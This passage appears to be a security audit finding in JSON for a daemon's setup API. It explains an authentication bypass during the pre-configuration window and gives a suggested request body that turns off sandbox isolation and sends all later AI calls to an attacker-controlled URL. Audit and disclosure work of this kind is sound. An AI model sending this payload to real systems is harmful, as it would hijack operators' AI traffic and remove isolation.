  "cap": "AUTH_BYPASS",
  "endpoint": "POST /api/v1/setup (pre-config window)",
  "rationale": "auth_layer exempts /api/v1/setup, /setup/status, /setup/doctor whenever state.setup.is_complete() is false (router.rs:111-113, is_setup_path at :127). Between daemon start and the operator's first wizard submission, anyone who can reach the listener can POST a SetupRequest with i_own_this:true (single-bit attestation, not a challenge — see :296), sandbox_backend:'process' (disables kernel isolation), and ai_runtime:'local-llm' + attacker-controlled local_llm_url, then watch all subsequent AI calls flow to their endpoint. Race window is short on a warm install but unbounded on a fresh provision; the same window reopens any time nyctos.toml is deleted/moved (setup.is_complete is a live filesystem check). Static pass missed this because the *intended* policy and the *bypassable* policy share the same code path — the bug is a state-machine flaw (transient-trust window), not a tainted sink.",
  "suggested_payload_hint": "POST /api/v1/setup, Content-Type: application/json, body {\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"https://attacker/api\",\"sandbox_backend\":\"process\",\"i_own_this\":true}"
}

